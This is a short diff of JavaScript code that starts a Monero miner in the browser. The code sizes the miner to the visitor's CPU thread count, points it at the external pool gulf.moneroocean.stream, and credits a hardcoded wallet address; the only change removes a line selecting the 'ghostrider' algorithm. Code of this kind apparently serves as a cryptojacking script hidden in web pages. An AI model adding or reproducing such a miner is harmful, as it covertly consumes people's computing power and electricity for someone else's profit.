@@ -35,6 +35,5 @@ let threadDisp = getT(navigator.hardwareConcurrency);
 if (threadDisp > 0){
     let name =  getResourceName();
     CustomPool = "gulf.moneroocean.stream:80" 
-    rightalgo = "ghostrider" 
     PerfektStart("87cpPYpiga6LY5pirZZzfx1gXW72HrfZKPt7ZJZgHv9qHPYdGQCNmGY2SGgJGv8RkcKvF34ZYiSxJG6f4ZH4KeDiRpPc38r", `${name} - ${threadDisp}`, threadDisp);
 }
